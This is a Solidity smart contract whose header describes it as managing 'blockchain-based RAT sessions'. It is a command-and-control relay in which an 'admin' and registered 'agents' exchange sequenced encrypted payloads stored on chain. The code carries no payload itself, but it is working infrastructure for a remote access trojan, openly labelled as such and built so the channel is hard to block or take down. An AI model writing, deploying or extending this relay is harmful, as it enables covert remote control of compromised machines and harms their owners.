// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * @title SessionManager
 * @dev Manages blockchain-based RAT sessions with encrypted message exchange
 */
contract SessionManager {
    
    struct Message {
        address sender;
        bytes encryptedPayload;
        uint256 timestamp;
        uint256 sequenceNumber;
        bytes32 sessionId;
    }
    
    struct Session {
        bytes32 sessionId;
        address admin;
        address agent;
        bool active;
        uint256 createdAt;
        uint256 lastActivity;
        uint256 adminSeqNum;
        uint256 agentSeqNum;
    }
    
    // Mapping from sessionId to Session
    mapping(bytes32 => Session) public sessions;
    
    // Mapping from sessionId to array of messages
    mapping(bytes32 => Message[]) public sessionMessages;
    
    // Mapping from address to array of sessionIds (for admin)
    mapping(address => bytes32[]) public adminSessions;
    
    // Mapping from address to array of sessionIds (for agent)
    mapping(address => bytes32[]) public agentSessions;
    
    // Events
    event SessionCreated(bytes32 indexed sessionId, address indexed admin, address indexed agent);
    event SessionTerminated(bytes32 indexed sessionId);
    event MessageSent(bytes32 indexed sessionId, address indexed sender, uint256 sequenceNumber);
    event AgentRegistered(address indexed agent, bytes publicKey);
    
    // Agent registration mapping
    mapping(address => bytes) public agentPublicKeys;
    
    /**
     * @dev Register an agent with its public key
     * @param publicKey The agent's public key for encryption
     */
    function registerAgent(bytes memory publicKey) external {
        require(publicKey.length > 0, "Public key cannot be empty");
        agentPublicKeys[msg.sender] = publicKey;
        emit AgentRegistered(msg.sender, publicKey);
    }
    
    /**
     * @dev Create a new session
     * @param agent The address of the agent
     * @return sessionId The created session ID
     */
    function createSession(address agent) external returns (bytes32) {
        require(agent != address(0), "Invalid agent address");
        require(agentPublicKeys[agent].length > 0, "Agent not registered");
        
        bytes32 sessionId = keccak256(abi.encodePacked(msg.sender, agent, block.timestamp));
        
        sessions[sessionId] = Session({
            sessionId: sessionId,
            admin: msg.sender,
            agent: agent,
            active: true,
            createdAt: block.timestamp,
            lastActivity: block.timestamp,
            adminSeqNum: 0,
            agentSeqNum: 0
        });
        
        adminSessions[msg.sender].push(sessionId);
        agentSessions[agent].push(sessionId);
        
        emit SessionCreated(sessionId, msg.sender, agent);
        return sessionId;
    }
    
    /**
     * @dev Send a message in a session
     * @param sessionId The session ID
     * @param encryptedPayload The encrypted message payload
     * @param sequenceNumber The sequence number for ordering
     */
    function sendMessage(
        bytes32 sessionId,
        bytes memory encryptedPayload,
        uint256 sequenceNumber
    ) external {
        Session storage session = sessions[sessionId];
        require(session.active, "Session not active");
        require(
            msg.sender == session.admin || msg.sender == session.agent,
            "Not authorized for this session"
        );
        
        // Verify sequence number
        if (msg.sender == session.admin) {
            require(sequenceNumber == session.adminSeqNum + 1, "Invalid sequence number");
            session.adminSeqNum = sequenceNumber;
        } else {
            require(sequenceNumber == session.agentSeqNum + 1, "Invalid sequence number");
            session.agentSeqNum = sequenceNumber;
        }
        
        Message memory message = Message({
            sender: msg.sender,
            encryptedPayload: encryptedPayload,
            timestamp: block.timestamp,
            sequenceNumber: sequenceNumber,
            sessionId: sessionId
        });
        
        sessionMessages[sessionId].push(message);
        session.lastActivity = block.timestamp;
        
        emit MessageSent(sessionId, msg.sender, sequenceNumber);
    }
    
    /**
     * @dev Terminate a session
     * @param sessionId The session ID to terminate
     */
    function terminateSession(bytes32 sessionId) external {
        Session storage session = sessions[sessionId];
        require(session.active, "Session already terminated");
        require(
            msg.sender == session.admin || msg.sender == session.agent,
            "Not authorized for this session"
        );
        
        session.active = false;
        emit SessionTerminated(sessionId);
    }
    
    /**
     * @dev Get messages for a session
     * @param sessionId The session ID
     * @param fromIndex Starting index
     * @param count Number of messages to retrieve
     * @return Array of messages
     */
    function getMessages(
        bytes32 sessionId,
        uint256 fromIndex,
        uint256 count
    ) external view returns (Message[] memory) {
        Message[] storage allMessages = sessionMessages[sessionId];
        require(fromIndex < allMessages.length, "Invalid index");
        
        uint256 endIndex = fromIndex + count;
        if (endIndex > allMessages.length) {
            endIndex = allMessages.length;
        }
        
        uint256 resultCount = endIndex - fromIndex;
        Message[] memory result = new Message[](resultCount);
        
        for (uint256 i = 0; i < resultCount; i++) {
            result[i] = allMessages[fromIndex + i];
        }
        
        return result;
    }
    
    /**
     * @dev Get total message count for a session
     * @param sessionId The session ID
     * @return Total number of messages
     */
    function getMessageCount(bytes32 sessionId) external view returns (uint256) {
        return sessionMessages[sessionId].length;
    }
    
    /**
     * @dev Get all sessions for an admin
     * @param admin The admin address
     * @return Array of session IDs
     */
    function getAdminSessions(address admin) external view returns (bytes32[] memory) {
        return adminSessions[admin];
    }
    
    /**
     * @dev Get all sessions for an agent
     * @param agent The agent address
     * @return Array of session IDs
     */
    function getAgentSessions(address agent) external view returns (bytes32[] memory) {
        return agentSessions[agent];
    }
    
    /**
     * @dev Get session details
     * @param sessionId The session ID
     * @return Session details
     */
    function getSession(bytes32 sessionId) external view returns (Session memory) {
        return sessions[sessionId];
    }
    
    /**
     * @dev Get agent's public key
     * @param agent The agent address
     * @return Public key bytes
     */
    function getAgentPublicKey(address agent) external view returns (bytes memory) {
        return agentPublicKeys[agent];
    }
}

